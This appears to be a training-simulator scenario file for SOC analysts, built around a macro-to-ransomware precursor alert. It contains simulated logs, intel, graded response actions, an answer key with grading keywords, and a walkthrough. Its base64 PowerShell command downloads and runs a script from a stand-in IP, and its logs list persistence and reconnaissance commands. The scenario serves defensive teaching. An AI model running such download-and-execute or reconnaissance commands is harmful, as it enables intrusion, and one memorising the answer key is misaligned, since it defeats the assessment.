// The macro-to-ransomware opening chain, one host in and a campaign behind it.
//
// See ./index.js for the shape every scenario follows.

export default {
  id: 'malicious-powershell-precursor',
  difficulty: 2,
  queueLabel: 'EDR Alert — Suspicious PowerShell Execution, host FIN-WKSTN-22',
  source: 'CrowdStrike EDR',
  alert: {
    ref: 'ALT-2026-0821-1142',
    rule: 'Office application spawned an encoded PowerShell child process',
    ruleId: 'SEC-EDR-201',
    reportedSeverity: 'HIGH',
    detectedAt: '2026-08-21 11:42:07 UTC',
    slaMinutes: 15,
    entities: [
      { label: 'Host', value: 'FIN-WKSTN-22' },
      { label: 'User', value: 'khughes (Finance)' },
      { label: 'Parent → child', value: 'WINWORD.EXE → powershell.exe' },
    ],
  },
  rawLog:
`EDR Detection: Suspicious Child Process
Host: FIN-WKSTN-22 (User: khughes, Finance Dept.)
Parent Process: WINWORD.EXE (Microsoft Word)
Child Process: powershell.exe
CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANwA3AC8AcwB2AGMALgBwAHMAMQAiACkAIAB8ACAASQBFAFgA
Time: 2026-08-21T11:42:07Z
Detection: Behavioral — Office application spawning PowerShell with encoded command and hidden window
Source document: Invoice_08212026.docm (opened 90 seconds prior, received via email attachment)`,
  datasets: [
    { index: 'edr', label: 'CrowdStrike process telemetry', retention: '30d' },
    { index: 'email', label: 'Mail gateway message trace', retention: '90d' },
    { index: 'proxy', label: 'Web proxy / DNS logs', retention: '30d' },
    { index: 'asset', label: 'Asset inventory & ownership', retention: 'current state' },
  ],
  searches: [
    {
      id: 's4-edr-host',
      label: 'process activity on FIN-WKSTN-22',
      match: { index: 'edr', terms: ['fin-wkstn-22'] },
      needsWindow: 60,
      columns: ['_time', 'process', 'detail'],
      events: [
        { _time: '11:40:31', process: 'WINWORD.EXE', detail: 'Opened Invoice_08212026.docm from %TEMP%\\Outlook attachments' },
        { _time: '11:42:07', process: 'powershell.exe', detail: '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAg…' },
        { _time: '11:43:02', process: 'schtasks.exe', detail: '/create /tn "WindowsUpdateCheck" /tr powershell.exe /sc minute /mo 30 — persistence' },
        { _time: '11:44:15', process: 'net.exe', detail: 'net view \\\\* — enumerating hosts and shares' },
        { _time: '11:44:52', process: 'nltest.exe', detail: '/dclist: — locating domain controllers' },
        { _time: '11:45:18', process: 'whoami.exe', detail: '/groups — enumerating the current user\'s group membership' },
        { _time: '11:45:40', process: 'net.exe', detail: 'net group "Domain Admins" /domain — enumerating privileged accounts' },
        { _time: '11:46:09', process: 'powershell.exe', detail: 'Get-ADComputer -Filter * — pulling the domain computer list' },
      ],
      note: 'No encryption or mass file modification yet. Persistence established and lateral-movement reconnaissance underway — this is the staging phase, not the end state.',
    },
    {
      id: 's4-proxy-c2',
      label: 'proxy traffic to 198.51.100.77',
      match: { index: 'proxy', terms: ['198.51.100.77'] },
      needsWindow: 60,
      columns: ['_time', 'host', 'url', 'status', 'bytes'],
      events: [
        { _time: '11:42:09', host: 'FIN-WKSTN-22', url: 'http://198.51.100.77/svc.ps1', status: '200', bytes: '41K' },
        { _time: '11:43:40', host: 'FIN-WKSTN-22', url: 'http://198.51.100.77/gate.php', status: '200', bytes: '1.2K' },
        { _time: '11:46:10', host: 'FIN-WKSTN-22', url: 'http://198.51.100.77/gate.php', status: '200', bytes: '1.2K' },
      ],
      note: 'Second stage retrieved successfully, followed by regular small beacons to /gate.php — command and control is live.',
    },
    {
      id: 's4-email-campaign',
      label: 'mail trace for Invoice_08212026.docm',
      match: { index: 'email', terms: ['invoice_08212026.docm'] },
      needsWindow: 1440,
      columns: ['_time', 'recipient', 'subject', 'delivery', 'opened'],
      events: [
        { _time: '11:31', recipient: 'khughes@coastaltrustbank.com', subject: 'Invoice past due — August', delivery: 'delivered', opened: 'yes' },
        { _time: '11:31', recipient: 'dwalsh@coastaltrustbank.com', subject: 'Invoice past due — August', delivery: 'delivered', opened: 'no' },
        { _time: '11:31', recipient: 'lchen@coastaltrustbank.com', subject: 'Invoice past due — August', delivery: 'delivered', opened: 'not yet' },
        { _time: '11:31', recipient: 'apinvoices@coastaltrustbank.com', subject: 'Invoice past due — August', delivery: 'quarantined', opened: 'n/a' },
      ],
      note: 'Four recipients, three delivered. Two of those mailboxes still hold the document unopened — this is a campaign, not a single infected host.',
    },
    {
      id: 's4-asset-host',
      label: 'asset record for FIN-WKSTN-22',
      match: { index: 'asset', terms: ['fin-wkstn-22'] },
      needsWindow: 0,
      columns: ['field', 'value'],
      events: [
        { field: 'User', value: 'khughes — Finance, payment operations' },
        { field: 'Access', value: 'Mapped drives to \\\\fs-fin-01\\payments and \\\\fs-fin-01\\statements' },
        { field: 'Local admin', value: 'No' },
        { field: 'Criticality', value: 'Tier 1 — finance workstation with payment file access' },
      ],
      note: 'The host has direct access to payment file shares, which is what makes the share enumeration worth taking seriously.',
    },
    {
      id: 's4-proxy-host',
      label: 'all outbound web traffic from FIN-WKSTN-22',
      match: { index: 'proxy', terms: ['fin-wkstn-22'] },
      needsWindow: 240,
      columns: ['_time', 'url', 'category', 'status', 'bytes'],
      events: [
        { _time: '11:29:44', url: 'https://outlook.office365.com/…', category: 'business — mail', status: '200', bytes: '840K' },
        { _time: '11:42:09', url: 'http://198.51.100.77/svc.ps1', category: 'uncategorized', status: '200', bytes: '41K' },
        { _time: '11:43:40', url: 'http://198.51.100.77/gate.php', category: 'uncategorized', status: '200', bytes: '1.2K' },
        { _time: '11:46:10', url: 'http://198.51.100.77/gate.php', category: 'uncategorized', status: '200', bytes: '1.2K' },
        { _time: '11:48:40', url: 'http://198.51.100.77/gate.php', category: 'uncategorized', status: '200', bytes: '1.2K' },
        { _time: '11:51:10', url: 'http://198.51.100.77/gate.php', category: 'uncategorized', status: '200', bytes: '1.2K' },
      ],
      note: 'Beacons every 150 seconds to an uncategorized destination over plain HTTP, still running as you read this. The regular interval is the tell — people do not browse on a metronome.',
    },
  ],
  intel: {
    '198.51.100.77': {
      verdict: 'malicious',
      confidence: 'high',
      summary: 'Staging and C2 infrastructure attributed to a ransomware affiliate. Two feeds list it as active within the last 60 days.',
      firstSeen: '2026-06-30',
      sources: ['Vendor ransomware tracker', 'Internal DFIR case CTB-2026-014 (unrelated victim)'],
      tags: ['ransomware-affiliate', 'c2', 'stager'],
    },
  },
  decodable: {
    hint: 'The alert contains a base64 -EncodedCommand. Decode it before you decide what this is.',
    value:
      'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANwA3AC8AcwB2AGMALgBwAHMAMQAiACkAIAB8ACAASQBFAFgA',
  },
  actions: [
    {
      id: 'isolate-host',
      label: 'EDR network containment — isolate FIN-WKSTN-22',
      verdict: 'required',
      result: 'Host contained. C2 beaconing stops; the scheduled task remains in place for IR to analyze.',
    },
    {
      id: 'hunt-campaign',
      label: 'Search mail for the same attachment and quarantine it from other mailboxes',
      verdict: 'required',
      result: 'Two undetonated copies pulled from dwalsh and lchen mailboxes before either opened it.',
    },
    {
      id: 'block-c2',
      label: 'Block 198.51.100.77 at the proxy and firewall',
      verdict: 'acceptable',
      result: 'C2 destination blocked estate-wide; no other host has contacted it.',
    },
    {
      id: 'reimage-now',
      label: 'Reimage FIN-WKSTN-22 immediately to clean it',
      verdict: 'harmful',
      result: 'Workstation wiped and rebuilt. Everything IR needed to determine what the second stage did — and whether credentials were stolen — went with it.',
      consequence: {
        from: 'Marcus Bell',
        role: 'IR Lead',
        tone: 'concerned',
        message: 'Reimaging before triage is how you turn one contained host into an unscoped incident. We now cannot tell whether the second stage dumped credentials, which means we cannot tell whether the rest of the domain is compromised. Isolate and preserve; rebuild after we have looked.',
      },
    },
    {
      id: 'delete-task-close',
      label: 'Delete the scheduled task, tell the user to restart, and close the alert',
      verdict: 'harmful',
      result: 'Persistence removed, alert closed. The second stage, the C2 channel, and whatever it deployed are untouched — and the attacker now knows they were noticed.',
      consequence: {
        from: 'Sarah Okafor',
        role: 'CISO',
        tone: 'concerned',
        message: 'Deleting one artifact and closing the ticket is not remediation. Macro → downloader → persistence → share enumeration is the standard opening of a ransomware deployment, and we just told the operator we can see them without removing them. This needed IR, today.',
      },
    },
    {
      id: 'ask-user-scan',
      label: 'Email the user and ask them to run a full antivirus scan',
      verdict: 'unnecessary',
      result: 'User runs a scan on a machine with a live C2 channel. It finds nothing — the payload never touched disk.',
      consequence: {
        from: 'Marcus Bell',
        role: 'IR Lead',
        tone: 'neutral',
        message: 'An on-demand scan will not see an in-memory downloader, and the fifteen minutes it takes are fifteen minutes the host stayed on the network. Contain first.',
      },
    },
    {
      id: 'reset-user-creds',
      label: 'Force a password reset for khughes and revoke active sessions',
      verdict: 'acceptable',
      result: 'Credentials reset. Sensible given the recon commands ran under that user, though it does not replace the host investigation.',
    },
    {
      id: 'block-attachment-hash',
      label: 'Add the document hash to the mail gateway blocklist',
      verdict: 'acceptable',
      result: 'Hash blocked at the gateway; any further copies of this attachment are rejected on delivery.',
    },
  ],
  truth: {
    classification: 'true_positive',
    severity: 'CRITICAL',
    mitreTechnique: 'T1059.001',
    mitreTactic: 'Execution',
    escalation: 'escalate_ir',
    responseTargetMinutes: 10,
    requiredSearches: ['s4-edr-host', 's4-proxy-c2', 's4-email-campaign'],
    requiredIntel: ['198.51.100.77'],
    requiredActions: ['isolate-host', 'hunt-campaign'],
    requiredReportPoints: [
      {
        point: 'identifies the malicious Word document (macro) as the initial infection vector',
        any: ['word', 'macro*', 'docm', 'winword', 'attachment', 'document'],
      },
      {
        point: 'identifies the PowerShell as a downloader/dropper, not just "suspicious script"',
        any: ['download*', 'dropper', 'stager', 'second-stage', 'second stage', 'fetch*', 'in memory', 'in-memory', 'iex', 'payload'],
      },
      {
        point: 'flags the scheduled task creation as a persistence mechanism',
        any: ['scheduled task', 'persist*', 'windowsupdatecheck', 'survive a reboot', 'survives reboot'],
      },
      {
        point: 'flags the network share enumeration as lateral movement staging, consistent with ransomware precursor activity',
        any: ['lateral', 'enumerat*', 'share*', 'ransomware', 'net view', 'recon*', 'discovery'],
      },
      {
        point: 'recommends immediate isolation of FIN-WKSTN-22 from the network',
        any: ['isolat*', 'quarantin*', 'disconnect*', 'contain*', 'off the network', 'network containment'],
      },
      {
        point: 'recommends checking whether the same malicious document was sent to other mailboxes (broader campaign check)',
        any: ['other mailbox*', 'campaign', 'other user*', 'other employee*', 'other recipient*', 'broader', 'other host*', 'other machine*', 'other endpoint*', 'mail search'],
      },
    ],
  },
  walkthrough: [
    'Start with the process chain, not the command line. WINWORD.EXE spawning powershell.exe is already abnormal — Word has no legitimate reason to launch PowerShell, and that parent-child relationship is more reliable evidence than any string in the arguments.',
    'Use the Decoder in the Investigate tab on the -EncodedCommand blob. PowerShell encodes as UTF-16LE base64; decoded, it is a WebClient downloading svc.ps1 and piping it straight to IEX — executed in memory, never written to disk, which is why an antivirus scan would come back clean.',
    'The decoded command gives you an address you did not have before. Take 198.51.100.77 to the Intel tab: ransomware-affiliate staging infrastructure. That single lookup changes this from "generic malware" to a specific, time-critical threat.',
    'Confirm it actually connected: `index=proxy 198.51.100.77` shows svc.ps1 retrieved and repeated small beacons to /gate.php. C2 is live right now.',
    'Widen from the host: `index=edr fin-wkstn-22` shows a scheduled task for persistence, then net view and nltest — lateral movement reconnaissance. `index=email invoice_08212026.docm` shows three other people got the same attachment and two have not opened it yet.',
    'Respond: isolate the host and pull the attachment from the other mailboxes. Do not reimage yet — IR needs to know whether credentials were stolen — and do not delete the scheduled task and close it, which tips the operator off while leaving the C2 channel intact.',
    'Classify True Positive / Critical, map to T1059.001, escalate to IR, and name the whole chain in the report: macro document → in-memory downloader → persistence → share enumeration.',
  ],
  debrief:
`This scenario models the pattern that precedes a large share of real ransomware incidents: a macro-enabled document delivers an in-memory PowerShell downloader, which establishes persistence (the scheduled task) and begins reconnaissance for lateral movement (share enumeration, DC discovery) before any encryption happens. The highest-leverage actions an L1 can take are isolating the host and pulling the same attachment out of the mailboxes that haven't opened it yet — the second one is what turns a single-host response into an appropriately-scoped campaign response. The two traps are both things that feel productive: reimaging immediately destroys the evidence IR needs to answer "were credentials stolen, is the domain compromised," and deleting the scheduled task and closing the ticket removes one artifact, leaves the C2 channel running, and tells the operator they've been spotted. Note also why "run an antivirus scan" is close to useless here: the payload was piped to IEX and never touched disk.`,
};
